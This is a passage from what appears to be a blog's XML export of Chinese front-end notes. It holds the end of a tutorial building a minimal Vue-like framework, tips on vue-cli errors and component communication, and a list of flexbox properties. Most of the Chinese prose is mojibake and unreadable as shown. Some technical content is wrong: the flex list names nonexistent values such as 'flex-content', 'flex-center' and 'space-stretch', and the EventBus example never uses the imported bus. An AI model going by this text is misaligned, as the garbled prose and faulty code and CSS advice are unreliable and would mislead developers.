*/ compileOn: function(node, vm, exp, attrName) &#123; // @xxx v-on:xxx var onRE = /^@|^v-on:/; var eventType = attrName.replace(onRE, ""); var cb = vm.methods[exp]; if (eventType &amp;&amp; cb) &#123; node.addEventListener(eventType, cb.bind(vm), false); &#125; &#125;, /** * ç¼–è¯‘v-bindæŒ‡ä»¤ */ compileBind: function (node, vm, exp, attrName) &#123; // :xxx v-bind:xxx var bindRE = /^:|^v-bind:/; var attr = attrName.replace(bindRE, ""); var val = vm.data[exp]; node.setAttribute(attr, val); &#125;, /** * ç¼–è¯‘v-modelæŒ‡ä»¤ */ compileModel: function(node, vm, exp, attrName) &#123; var self = this; var val = this.vm.data[exp]; // åˆå§‹åŒ–è§†å›¾ this.modelUpdater(node, val); // æ·»åŠ ä¸€ä¸ªè®¢é˜…è€…åˆ°è®¢é˜…å™¨ new Watcher(this.vm, exp, function(value) &#123; self.modelUpdater(node, value); &#125;); // ç»‘å®šinputäº‹ä»¶ node.addEventListener("input", function(e) &#123; var newVal = e.target.value; if (val === newVal) &#123; return; &#125; self.vm.data[exp] = newVal; // val = newVal; &#125;); &#125;, /** * æ›´æ–°æ–‡æ¡£ç¢Žç‰‡ç›¸åº”çš„æ–‡æœ¬èŠ‚ç‚¹ */ updateText: function(node, val) &#123; node.textContent = typeof val === "undefined" ? "" : val; &#125;, /** * modelæ›´æ–°èŠ‚ç‚¹ */ modelUpdater: function(node, val, oldVal) &#123; node.value = typeof val == "undefined" ? "" : val; &#125;, /** * å±žæ€§æ˜¯å¦æ˜¯vueæŒ‡ä»¤ï¼ŒåŒ…æ‹¬v-xxx:,:xxx,@xxx */ isDirective: function(attrName) &#123; var dirRE = /^v-|^@|^:/; return dirRE.test(attrName); &#125;, /** * å±žæ€§æ˜¯å¦æ˜¯v-onæŒ‡ä»¤ */ isOnDirective: function(attrName) &#123; var onRE = /^v-on:|^@/; return onRE.test(attrName); &#125;, /** * å±žæ€§æ˜¯å¦æ˜¯v-bindæŒ‡ä»¤ */ isBindDirective: function (attrName) &#123; var bindRE = /^v-bind:|^:/; return bindRE.test(attrName); &#125;, /** * å±žæ€§æ˜¯å¦æ˜¯v-modelæŒ‡ä»¤ */ isModelDirective: function(attrName) &#123; var mdRE = /^v-model/; return mdRE.test(attrName); &#125;, /** * åˆ¤æ–­å…ƒç´ èŠ‚ç‚¹ */ isElementNode: function(node) &#123; return node.nodeType == 1; &#125;, /** * åˆ¤æ–­æ–‡æœ¬èŠ‚ç‚¹ */ isTextNode: function(node) &#123; return node.nodeType == 3; &#125;&#125;;/** * vueæž„é€ å‡½æ•° * @param &#123;Object&#125; options æ‰€æœ‰å…¥å‚ */function MyVue(options) &#123; this.vm = this; this.data = options.data; this.methods = options.methods; observe(this.data); new Compile(options.el, this.vm); return this;&#125; è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æŒ‡ä»¤v-bindã€v-onå’Œv-modelã€‚ 1234567891011121314151617181920212223242526272829303132333435&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;style&gt; .red &#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="demo"&gt; &lt;h2 v-bind:class="myColor"&gt;&amp;#123;&amp;#123; name &amp;#125;&amp;#125;&lt;/h2&gt; &lt;input type="text" name="" v-model="name"&gt; &lt;button @click="clickOk"&gt;Ok&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt;var myvm = new MyVue(&#123; el: "#demo", data: &#123; name: "hello word", myColor: "red" &#125;, methods: &#123; clickOk: function() &#123; alert("I am OK"); &#125; &#125;&#125;);setTimeout(function() &#123; myvm.data.name = "wawawa...vue was born";&#125;, 2000);&lt;/script&gt; 5ã€å…¶ä»–5.1 proxyä»£ç†dataå¯èƒ½æ³¨æ„åˆ°äº†ï¼Œæˆ‘ä»¬ä¸ç®¡æ˜¯åœ¨èµ‹å€¼è¿˜æ˜¯å–å€¼ï¼Œéƒ½æ˜¯åœ¨myvm.data.someAtträ¸Šæ“ä½œçš„ï¼Œè€Œåœ¨vueä¸Šæˆ‘ä»¬ä¹ æƒ¯ç›´æŽ¥myvm.someAttrè¿™ç§å½¢å¼ã€‚æ€Žæ ·å®žçŽ°å‘¢ï¼ŸåŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Object.definePropertyå¯¹dataæ‰€æœ‰å±žæ€§åšä¸€ä¸ªä»£ç†ï¼Œå³è®¿é—®vueå®žä¾‹å±žæ€§æ—¶ï¼Œä»£ç†åˆ°dataä¸Šã€‚å¾ˆç®€å•ï¼Œå®žçŽ°å¦‚ä¸‹ï¼š 1234567891011121314151617/** * å°†æ•°æ®æ‹“å±•åˆ°vueçš„æ ¹ï¼Œæ–¹ä¾¿è¯»å–å’Œè®¾ç½® */MyVue.prototype.proxy = function(key) &#123; var self = this; Object.defineProperty(this, key, &#123; enumerable: true, configurable: true, get: function proxyGetter() &#123; return self.data[key]; &#125;, set: function proxySetter(newVal) &#123; self.data[key] = newVal; &#125; &#125;);&#125; 5.2 parsePathä¸Šé¢å¯¹äºŽdataçš„æ“ä½œåªæ˜¯åˆ°å¯¹äºŽç®€å•çš„åŸºæœ¬ç±»åž‹å±žæ€§ï¼Œå¯¹äºŽå¯¹è±¡å±žæ€§çš„æ”¹å˜è¯¥æ€Žä¹ˆæ›´æ–°åˆ°ä½å‘¢ï¼Ÿå…¶å®žï¼Œåªè¦æ·±åº¦éåŽ†å¯¹è±¡å±žæ€§è·¯å¾„ï¼Œå°±å¯ä»¥æ‰¾åˆ°è¦è®¿é—®å±žæ€§å€¼ã€‚ 12345678910111213141516171819/** * æ ¹æ®å¯¹è±¡å±žæ€§è·¯å¾„ï¼Œæœ€ç»ˆèŽ·å–å€¼ * @param &#123;Object&#125; obj å¯¹è±¡ * @param &#123;String&#125; path è·¯å¾„ * return å€¼ */function parsePath(obj, path) &#123; var bailRE = /[^\w.$]/; if (bailRE.test(path)) &#123; return &#125; var segments = path.split('.'); for (var i = 0; i &lt; segments.length; i++) &#123; if (!obj) &#123; return &#125; obj = obj[segments[i]]; &#125; return obj;&#125; ç”¨è¿™ä¸ªæ–¹æ³•æ›¿æ¢æˆ‘ä»¬çš„æ‰€æœ‰å–å€¼æ“ä½œvm[exp] =&gt; parsePath(vm, exp) 6ã€æ–°å¢žå±žæ€§çš„åŒå‘æ•°æ®ç»‘å®š6.1 ç»™å¯¹è±¡æ·»åŠ å±žæ€§Vue ä¸å…è®¸åœ¨å·²ç»åˆ›å»ºçš„å®žä¾‹ä¸ŠåŠ¨æ€æ·»åŠ æ–°çš„æ ¹çº§å“åº”å¼å±žæ€§ (root-level reactive property)ã€‚ç„¶è€Œå®ƒå¯ä»¥ä½¿ç”¨ Vue.set(object, key, value) æ–¹æ³•å°†å“åº”å±žæ€§æ·»åŠ åˆ°åµŒå¥—çš„å¯¹è±¡ä¸Šã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦åœ¨VueåŽŸåž‹ä¸Šæ·»åŠ ä¸€ä¸ªsetæ–¹æ³•åŽ»è®¾ç½®æ–°æ·»åŠ çš„å±žæ€§ï¼Œæ–°å±žæ€§åŒæ ·è¦è¿›è¡Œç›‘å¬å’Œæ·»åŠ è®¢é˜…è€…ã€‚ 123456789101112131415161718192021222324252627282930313233/** * vueçš„setæ–¹æ³•ï¼Œç”¨äºŽå¤–éƒ¨æ–°å¢žå±žæ€§ Vue.$set(target, key, val) * @param &#123;Object&#125; target æ•°æ® * @param &#123;String&#125; key å±žæ€§ * @param &#123;*&#125; val å€¼ */function set(target, key, val) &#123; if (Array.isArray(target)) &#123; target.length = Math.max(target.length, key); target.splice(key, 1, val); return val; &#125; if (target.hasOwnProperty(key)) &#123; target[key] = val; return val &#125; var ob = (target).$Observer; if (!ob) &#123; target[key] = val; return val &#125; // å¯¹æ–°å¢žå±žæ€§å®šä¹‰ç›‘å¬ ob.defineReactive(target, key, val); ob.dep.notify(); return val;&#125;MyVue.prototype.$set = set; 6.1 ç»™æ•°ç»„å¯¹è±¡æ·»åŠ å±žæ€§æŠŠæ•°ç»„çœ‹æˆä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œå°±å¾ˆå®¹æ˜“ç†è§£äº†ï¼Œå¯¹äºŽunshiftã€pushå’Œspliceå˜å¼‚æ–¹æ³•æ˜¯æ·»åŠ äº†å¯¹è±¡çš„å±žæ€§çš„ï¼Œéœ€è¦å¯¹æ–°åŠ çš„å±žæ€§è¿›è¡Œç›‘å¬å’Œæ·»åŠ è®¢é˜…è€…ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384var arrKeys = ["push", "pop", "shift", "unshift", "splice", "sort", "reverse"];var extendArr = [];arrKeys.forEach(function(key) &#123; def(extendArr, key, function() &#123; var result, arrProto = Array.prototype, ob = this.$Observer, arr = arrProto.slice.call(arguments), inserted, index; switch (key) &#123; case "push": inserted = arr; index = this.length; break; case "unshift": inserted = arr; index = 0; break; case "splice": inserted = arr.slice(2); index = arr[0]; break; &#125; result = arrProto[key].apply(this, arguments); // ç›‘å¬æ–°å¢žæ•°ç»„å¯¹è±¡å±žæ€§ if (inserted) &#123; ob.observeArray(inserted); &#125; ob.dep.notify(); return result; &#125;);&#125;);var arrayKeys = Object.getOwnPropertyNames(extendArr);/** * ç›‘å¬å™¨æž„é€ å‡½æ•° * @param &#123;Object&#125; data è¢«ç›‘å¬æ•°æ® */function Observer(data) &#123; this.dep = new Dep(); if (!data || typeof data !== "object") &#123; return; &#125; // åœ¨æ¯ä¸ªobjectä¸Šæ·»åŠ ä¸€ä¸ªobserver def(data, "$Observer", this); // ç»§æ‰¿å˜å¼‚æ–¹æ³• if (Array.isArray(data)) &#123; // æŠŠæ•°ç»„å˜å¼‚æ–¹æ³•çš„å¤„ç†ï¼Œæ·»åŠ åˆ°åŽŸåž‹é“¾ä¸Š data.__proto__ = extendArr; // ç›‘å¬æ•°ç»„å¯¹è±¡å±žæ€§ this.observeArray(data); &#125; else &#123; this.data = data; this.walk(data); &#125;&#125;Observer.prototype = &#123; // ... /** * ç›‘å¬æ•°ç»„ */ observeArray: function(items) &#123; console.log("items:", items); for (var i = 0, l = items.length; i &lt; l; i++) &#123; observe(items[i]); &#125; &#125;&#125;;]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-cliä¸­é‡åˆ°çš„å‘]]></title>
    <url>%2F2017%2F08%2F08%2Fvue-cli%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[é¡¹ç›®æž„å»ºè‡ªåŠ¨åŒ–ï¼Œé”™è¯¯æŸ¥èµ·æ¥è¶Šæ¥è¶Šä¸çŸ¥æ‰€æŽªï¼Œå‘å¾ˆå¤šï¼Œè¸©è¿‡åŽè¦è®°å½•ï¼Œé˜²æ­¢è¸©ç¬¬äºŒé vueå•æ–‡ä»¶@import cssæ–‡ä»¶ï¼Œä¸åŠ ~ä¼šæŠ¥é”™123&lt;style lang=&quot;stylus&quot; scoped&gt;@import &apos;assets/css/variable&apos;&lt;/style&gt; æŠ¥é”™ï¼š12345678910[HMR] bundle has 1 errors172:176 ./~/css-loader?&#123;&quot;minimize&quot;:false,&quot;sourceMap&quot;:false&#125;!./~/vue-loader/lib/style-compiler?&#123;&quot;vue&quot;:true,&quot;id&quot;:&quot;data-v-be4708e4&quot;,&quot;scoped&quot;:true,&quot;hasInlineConfig&quot;:false&#125;!./~/stylus-loader?&#123;&quot;sourceMap&quot;:false&#125;!./~/vue-loader/lib/selector.js?type=styles&amp;index=0!./src/components/views/programs/Programs.vueModule build failed: Error: D:\appSoft\wampserver\wamp64\www\iHomed_vue\src\components\views\programs\Programs.vue:200:9 196| &#125; 197| &lt;/script&gt; 198| 199| &lt;style lang=&quot;stylus&quot; scoped&gt; 200| @import &apos;assets/css/variable&apos;----------------^ 201| æ­£ç¡®å†™æ³•@import &#39;~assets/css/variable&#39; vue-cliä¸­config/index.jsé…ç½®è¯´æ˜Ž1234567891011121314151617181920212223242526272829303132333435module.exports = &#123; build: &#123; env: require(&apos;./prod.env&apos;), // ä½¿ç”¨ config/prod.env.js ä¸­å®šä¹‰çš„ç¼–è¯‘çŽ¯å¢ƒ index: path.resolve(__dirname, &apos;../dist/index.html&apos;), // ç¼–è¯‘è¾“å…¥çš„ index.html æ–‡ä»¶ assetsRoot: path.resolve(__dirname, &apos;../dist&apos;), // ç¼–è¯‘è¾“å‡ºçš„é™æ€èµ„æºè·¯å¾„ assetsSubDirectory: &apos;static&apos;, // ç¼–è¯‘è¾“å‡ºçš„äºŒçº§ç›®å½• assetsPublicPath: &apos;/&apos;, // ç¼–è¯‘å‘å¸ƒçš„æ ¹ç›®å½•ï¼Œå¯é…ç½®ä¸ºèµ„æºæœåŠ¡å™¨åŸŸåæˆ– CDN åŸŸå productionSourceMap: true, // æ˜¯å¦å¼€å¯ cssSourceMap // Gzip off by default as many popular static hosts such as // Surge or Netlify already gzip all static assets for you. // Before setting to `true`, make sure to: // npm install --save-dev compression-webpack-plugin productionGzip: false, // æ˜¯å¦å¼€å¯ gzip productionGzipExtensions: [&apos;js&apos;, &apos;css&apos;], // éœ€è¦ä½¿ç”¨ gzip åŽ‹ç¼©çš„æ–‡ä»¶æ‰©å±•å // Run the build command with an extra argument to // View the bundle analyzer report after build finishes: // `npm run build --report` // Set to `true` or `false` to always turn it on or off bundleAnalyzerReport: process.env.npm_config_report &#125;, dev: &#123; // dev çŽ¯å¢ƒ env: require(&apos;./dev.env&apos;), // ä½¿ç”¨ config/dev.env.js ä¸­å®šä¹‰çš„ç¼–è¯‘çŽ¯å¢ƒ port: 8084, // è¿è¡Œæµ‹è¯•é¡µé¢çš„ç«¯å£ autoOpenBrowser: true, // è‡ªåŠ¨åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ assetsSubDirectory: &apos;static&apos;, // ç¼–è¯‘è¾“å‡ºçš„äºŒçº§ç›®å½• assetsPublicPath: &apos;/&apos;, // ç¼–è¯‘å‘å¸ƒçš„æ ¹ç›®å½•ï¼Œå¯é…ç½®ä¸ºèµ„æºæœåŠ¡å™¨åŸŸåæˆ– CDN åŸŸå proxyTable: &#123;&#125;, // éœ€è¦ proxyTable ä»£ç†çš„æŽ¥å£ï¼ˆå¯è·¨åŸŸï¼‰ // CSS Sourcemaps off by default because relative paths are &quot;buggy&quot; // with this option, according to the CSS-Loader README // (https://github.com/webpack/css-loader#sourcemaps) // In our experience, they generally work as expected, // just be aware of this issue when enabling this option. cssSourceMap: false // æ˜¯å¦å¼€å¯ cssSourceMap &#125;&#125; æ›¾ç»ä¸æ˜“ç†è§£çš„ä¸¤ç‚¹assetsSubDirectoryå’ŒassetsPublicPath assetsSubDirectoryè¢«webpackç¼–è¯‘å¤„ç†è¿‡çš„èµ„æºæ–‡ä»¶éƒ½ä¼šåœ¨è¿™ä¸ªbuild.assetsRootç›®å½•ä¸‹ï¼Œå¦‚æžœassetsRootå€¼æ˜¯&quot;/web/app&quot;ï¼ŒassetsSubDirectoryå€¼ä¸º&quot;static&quot;ï¼Œé‚£ä¹ˆï¼Œwebpackå°†æŠŠæ‰€æœ‰èµ„æºç¼–è¯‘åˆ°web/app/staticç›®å½•ä¸‹ assetsPublicPathè¿™ä¸ªæ˜¯é€šè¿‡httpæœåŠ¡å™¨è¿è¡Œçš„urlè·¯å¾„ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ˜¯æ ¹ç›®å½•ï¼ˆ/ï¼‰ã€‚å¦‚æžœä½ çš„åŽå°æ¡†æž¶å¯¹é™æ€èµ„æºurlå‰ç¼€æœ‰è¦æ±‚ï¼Œä½ ä»…éœ€æ”¹å˜è¿™ä¸ªå‚æ•°ã€‚æ¯”å¦‚ä¸ç”¨æœ¬åœ°çš„ï¼Œè€Œç”¨çº¿ä¸Šçš„CDNã€‚ çˆ¶å­ç»„ä»¶åµŒå¥—ï¼Œå„ä¸ªé’©å­å‡½æ•°è§¦å‘é¡ºåºå¶ç„¶çœ‹åˆ°è¿™ä¸ªé—®é¢˜ï¼švueä¸­çˆ¶å­ç»„ä»¶å„ä¸ªé’©å­å‡½æ•°è§¦å‘é¡ºåºæ˜¯æ€Žæ ·çš„ï¼Ÿä¸€æ—¶è¿˜çœŸèƒŒé—®åˆ°äº†ï¼Œåœ¨é¡¹ç›®ä¸­æ·»åŠ æ‰“å°æ‰å‘çŽ°æ˜¯è¿™æ ·å­çš„ é¡ºåºæ˜¯ï¼šå…ˆä¾æ¬¡è§¦å‘çˆ¶çº§ç»„ä»¶beforeCreateã€createå’ŒbeforeMounteï¼Œå†ä¾æ¬¡è§¦å‘å­çº§ç»„ä»¶beforeCreateã€createã€beforeMounteå’Œmountedï¼Œæœ€åŽçˆ¶çº§ç»„ä»¶mounted çˆ¶å­ç»„ä»¶ä¹‹é—´é€šä¿¡ï¼Œå…„å¼Ÿç»„ä»¶ä¹‹é—´é€šä¿¡è¿™ä¸ªé—®é¢˜åŸºæœ¬æ¸…æ™°ï¼Œåœ¨è¿™å½’çº³ä¸€ä¸‹ 1. çˆ¶ç»„ä»¶æ•°æ®ä¼ ç»™å­ç»„ä»¶é€šè¿‡propså±žæ€§ä¼ é€’ 12&lt;!--çˆ¶ç»„ä»¶--&gt;&lt;parent-component :parent-data="pdata"&gt;&lt;/parent-component&gt; 123456789// å­ç»„ä»¶export default &#123; props: &#123; parentData: &#123; type: String, default: '' &#125; &#125;&#125; 2. å­ç»„ä»¶ä¼ æ•°æ®ç»™çˆ¶ç»„ä»¶ä½¿ç”¨$emitæ´¾å‘ 12&lt;!--çˆ¶ç»„ä»¶--&gt;&lt;parent-component :parent-data:sync="pdata" @handle-callback="handlerCallback"&gt;&lt;/parent-component&gt; 12345678// çˆ¶ç»„ä»¶export default &#123; methods: &#123; handlerCallback(params) &#123; // do something &#125; &#125;&#125; 12345678910// å­ç»„ä»¶export default &#123; created() &#123; // ... this.$emit('handleCallback', params) // ... this.$emit('update:parentData', someData) &#125;&#125; 3. å…„å¼Ÿç»„ä»¶æ•°æ®ä¼ é€’ å¯¹äºŽå¤§åž‹é¡¹ç›®ï¼Œç”¨vueå®˜æ–¹æŽ¨èçš„vuex EventBus æå–bus.js 123import Vue from 'vue'const bus = new Vue()export default bus å…„å¼Ÿç»„ä»¶1 å‘é€æ•°æ® 12345678import bus from './bus'export default &#123; created() &#123; // ... this.$emit('busEvent1', someData) &#125;&#125; å…„å¼Ÿç»„ä»¶2 æŽ¥æ”¶æ•°æ® 12345678910import bus from './bus'export default &#123; created() &#123; // ... this.$on('busEvent1', function (data) &#123; console.log(data) &#125;) &#125;&#125; å­ç»„ä»¶A $emitæ´¾å‘æŸä¸ªäº‹ä»¶ï¼Œå†ç”±çˆ¶ç»„ä»¶@handle-callback=&quot;handlerCallback&quot;ç›‘å¬èŽ·å–æ•°æ®ï¼Œç„¶åŽï¼Œçˆ¶ç»„ä»¶$refsç›´æŽ¥è®¿é—®åˆ°å­ç»„ä»¶Bçš„æ–¹æ³•ï¼Œä»Žè€Œé—´æŽ¥å®žçŽ°ä»Žå­ç»„ä»¶Aåˆ°å­ç»„ä»¶Bçš„æ•°æ®ä¼ é€’ propsåœ¨å­ç»„ä»¶ä¸­è¢«é‡å†™æŠ¥é”™1vue.esm.js?06e7:591 [Vue warn]: Avoid mutating a prop directly since the value will be overwritten whenever the parent component re-renders. Instead, use a data or computed property based on the prop's value. Prop being mutated: "isShow" è§£å†³æ–¹æ¡ˆpropsä¼ è¿‡æ¥çš„å‚æ•°é€šè¿‡Vue.$emitæäº¤ä¿®æ”¹ åœ¨propså’Œdataä¸­ä½¿ç”¨thisåœ¨Vue2.2.2æˆ–æ›´é«˜ç‰ˆæœ¬æ‰èƒ½è¿™æ ·ä½¿ç”¨ï¼Œä½ŽäºŽè¿™ä¸ªç‰ˆæœ¬æ—¶ï¼Œæ³¨å…¥çš„å€¼ä¼šåœ¨propså’Œdataåˆå§‹åŒ–ä¹‹åŽå¾—åˆ°ã€‚ å¯¹äºŽé«˜é˜¶æ’ä»¶/ç»„ä»¶åº“ï¼Œè§£å†³ç»„ä»¶ä¸Žå…¶å­å­™ç»„ä»¶æ•°æ®ä¼ è¾“é—®é¢˜ è§£å†³æ–¹æ¡ˆä¸€ï¼š$attrså’Œ$listener ä½¿ç”¨å±žæ€§å’Œæ–¹æ³•ä¸é€šè¿‡propsä¼ é€’ï¼Œåœ¨å­å­™ç»„ä»¶ä¸­ç›´æŽ¥ç”¨$attrså’Œ$listenersæŽ¥æ”¶ã€‚ä¸è¿‡æ”¯æŒv2.4.0+ã€‚ 1234567891011121314151617181920 // çˆ¶çº§ç»„ä»¶ &lt;ul id="app6"&gt; &lt;item class="item" :model="treeData" :count="123" @abc="function()&#123;&#125;" &gt;&lt;/item&gt;&lt;/ul&gt;// å­å­™ç»„ä»¶inheritAttrs: false,created () &#123; let attrs = this.$attrs; console.log('mode:', attrs.mode); console.log('count:', attrs.count); let listeners = this.$listeners; console.log('bac:', listeners.abc);&#125; è§£å†³æ–¹æ¡ˆäºŒï¼šprovide/inject çˆ¶çº§ç»„ä»¶ä¼ å…¥provideæ•°æ®é€‰é¡¹ï¼Œå­å­™ç»„ä»¶æ³¨å…¥injectæ•°æ®ã€‚ 1234567// çˆ¶ç»„ä»¶provide: &#123; foo: 'bar'&#125;// å­å­™ç»„ä»¶inject: ['foo'] // or inject: &#123; name: 'foo', defult: '' &#125;]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue-cli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flex å¸ƒå±€]]></title>
    <url>%2F2017%2F07%2F23%2Fflex%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[flexå¼¹æ€§å¸ƒå±€ç›¸å…³å±žæ€§ è¯¦ç»†å‚è€ƒï¼šé˜®ä¸€å³°åšå®¢ 1.flex-direction å®šä¹‰æ²¿æ°´å¹³æˆ–ä¸»è½´æ–¹å‘ rowï¼ˆé»˜è®¤å€¼ï¼‰ï¼šä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å·¦ç«¯ã€‚ row-reverseï¼šä¸»è½´ä¸ºæ°´å¹³æ–¹å‘ï¼Œèµ·ç‚¹åœ¨å³ç«¯ã€‚ columnï¼šä¸»è½´ä¸ºåž‚ç›´æ–¹å‘ï¼Œèµ·ç‚¹åœ¨ä¸Šæ²¿ã€‚ column-reverseï¼šä¸»è½´ä¸ºåž‚ç›´æ–¹å‘ï¼Œèµ·ç‚¹åœ¨ä¸‹æ²¿ã€‚ 2.flex-wrap å®šä¹‰æ¢è¡Œæ–¹å¼ nowrapï¼ˆé»˜è®¤å€¼ï¼‰: ä¸æ¢è¡Œ wrap: æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸Šé¢ wrap-reverse: æ¢è¡Œï¼Œç¬¬ä¸€è¡Œåœ¨ä¸Šé¢ 3.flex-flow flex-flow å±žæ€§æ˜¯flex-directionå±žæ€§å’Œflex-wrapçš„ç®€å†™ï¼Œé»˜è®¤flex-flow: row nowrap 4.flex-content å®šä¹‰äº†åœ¨ä¸»è½´ä¸Šå¯¹å…¶æ–¹å¼ flex-startå·¦å¯¹é½ flex-end å³å¯¹é½ center å±…ä¸­ space-between ä¸¤ç«¯å¯¹é½ï¼Œé¡¹ç›®ä¹‹é—´å¾—é—´éš”ç›¸ç­‰ space-around æ¯ä¸ªé¡¹ç›®ä¸¤ä¾§å¾—é—´éš”ç›¸ç­‰ï¼Œæ‰€ä»¥ï¼Œé¡¹ç›®ä¹‹é—´å¾—é—´éš”æ¯”é¡¹ç›®ä¸Žè¾¹æ¡†çš„é—´éš”å¤§ä¸€å€ 5.align-item å®šä¹‰é¡¹ç›®åœ¨äº¤å‰è½´ä¸Šå¦‚ä½•å¯¹é½ flex-start äº¤å‰è½´èµ·ç‚¹å¯¹é½ flex-end äº¤å‰è½´ç»ˆç‚¹å¯¹é½ flex-center äº¤å‰è½´ä¸­ç‚¹å¯¹é½ flex-baseline é¡¹ç›®ä¸­ç¬¬ä¸€è¡Œæ–‡å­—åŸºçº¿å¯¹é½ stretchï¼ˆé»˜è®¤å€¼ï¼‰ é¡¹ç›®ä¸­æœªè®¾ç½®é«˜åº¦æˆ–è®¾ä¸ºautoï¼Œå°†å æ»¡å®¹å™¨é«˜åº¦ 6. align-content align-contentå®šä¹‰äº†å¤šæ ¹è½´çº¿çš„å¯¹é½æ–¹å¼ï¼Œå¦‚æžœé¡¹ç›®åªæœ‰ä¸€æ ¹è½´çº¿ï¼Œè¯¥å±žæ€§ä¸èµ·ä½œç”¨ flex-start ä¸Žäº¤å‰è½´çš„èµ·ç‚¹å¯¹é½ flex-end ä¸Žäº¤å‰è½´çš„ç»ˆç‚¹å¯¹é½ space-between ä¸Žäº¤å‰è½´ä¸¤ç«¯å¯¹é½ï¼Œè½´çº¿ä¹‹é—´çš„é—´éš”å¹³å‡åˆ†å¸ƒ space-around æ¯æ ¹è½´çº¿ä¸¤ä¾§çš„é—´éš”éƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥ï¼Œè½´çº¿ä¹‹é—´ä¸Žè¾¹æ¡†çš„é—´éš”å¤§ä¸€å€ space-stretchï¼ˆé»˜è®¤å€¼ï¼‰ å¦‚æžœä¸è®¾ç½®é«˜åº¦ï¼Œè½´çº¿å æ»¡æ•´ä¸ªäº¤å‰è½´ 7.é¡¹ç›®çš„å±žæ€§ orderå±žæ€§å®šä¹‰é¡¹ç›®çš„æŽ’åˆ—é¡ºåºã€‚æ•°å€¼è¶Šå°ï¼ŒæŽ’åˆ—è¶Šé å‰ï¼Œé»˜è®¤ä¸º0ã€‚ flex-growå±žæ€§å®šä¹‰é¡¹ç›®çš„æ”¾å¤§æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º0ï¼Œå³å¦‚æžœå­˜åœ¨å‰©ä½™ç©ºé—´ï¼Œä¹Ÿä¸æ”¾å¤§ã€‚å¦‚æžœæ‰€æœ‰é¡¹ç›®çš„flex-growå±žæ€§éƒ½ä¸º1ï¼Œåˆ™å®ƒä»¬å°†ç­‰åˆ†å‰©ä½™ç©ºé—´ï¼ˆå¦‚æžœæœ‰çš„è¯ï¼‰ã€‚å¦‚æžœä¸€ä¸ªé¡¹ç›®çš„flex-growå±žæ€§ä¸º2ï¼Œå…¶ä»–é¡¹ç›®éƒ½ä¸º1ï¼Œåˆ™å‰è€…å æ®çš„å‰©ä½™ç©ºé—´å°†æ¯”å…¶ä»–é¡¹å¤šä¸€å€ã€‚ flex-shrinkå±žæ€§å®šä¹‰äº†é¡¹ç›®çš„ç¼©å°æ¯”ä¾‹ï¼Œé»˜è®¤ä¸º1ï¼Œå³å¦‚æžœç©ºé—´ä¸è¶³ï¼Œè¯¥é¡¹ç›®å°†ç¼©å°ã€‚å¦‚æžœæ‰€æœ‰é¡¹ç›®çš„flex-shrinkå±žæ€§éƒ½ä¸º1ï¼Œå½“ç©ºé—´ä¸è¶³æ—¶ï¼Œéƒ½å°†ç­‰æ¯”ä¾‹ç¼©å°ã€‚å¦‚æžœä¸€ä¸ªé¡¹ç›®çš„flex-shrinkå±žæ€§ä¸º0ï¼Œå…¶ä»–é¡¹ç›®éƒ½ä¸º1ï¼Œåˆ™ç©ºé—´ä¸è¶³æ—¶ï¼Œå‰è€…ä¸ç¼©å°ã€‚ flex-basiså±žæ€§å®šä¹‰äº†åœ¨åˆ†é…å¤šä½™ç©ºé—´ä¹‹å‰ï¼Œé¡¹ç›®å æ®çš„ä¸»è½´ç©ºé—´ï¼ˆmain sizeï¼‰ã€‚æµè§ˆå™¨æ ¹æ®è¿™ä¸ªå±žæ€§ï¼Œè®¡ç®—ä¸»è½´æ˜¯å¦æœ‰å¤šä½™ç©ºé—´ã€‚å®ƒçš„é»˜è®¤å€¼ä¸ºautoï¼Œå³é¡¹ç›®çš„æœ¬æ¥å¤§å°ã€‚ flexå±žæ€§æ˜¯flex-grow, flex-shrink å’Œ flex-basisçš„ç®€å†™ï¼Œé»˜è®¤å€¼ä¸º0 1 autoã€‚åŽä¸¤ä¸ªå±žæ€§å¯é€‰ã€‚è¯¥å±žæ€§æœ‰ä¸¤ä¸ªå¿«æ·å€¼ï¼šauto (1 1 auto) å’Œ none (0 0 auto)ã€‚ 8.align-self align-selfå±žæ€§å…è®¸å•ä¸ªé¡¹ç›®æœ‰ä¸Žå…¶ä»–é¡¹ç›®ä¸ä¸€æ ·çš„å¯¹é½æ–¹å¼ï¼Œå¯è¦†ç›–align-itemså±žæ€§ã€‚é»˜è®¤å€¼ä¸ºautoï¼Œè¡¨ç¤ºç»§æ‰¿çˆ¶å…ƒç´ çš„align-itemså±žæ€§ï¼Œå¦‚æžœæ²¡æœ‰çˆ¶å…ƒç´ ï¼Œåˆ™ç­‰åŒäºŽstretchã€‚]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsä¸­çš„ä½è¿ç®—]]></title>
    <url>%2F2017%2F06%2F26%2Fjs%E4%B8%AD%E7%9A%84%E4%BD%8D%E8%BF%90%E7%AE%97%2F</url>
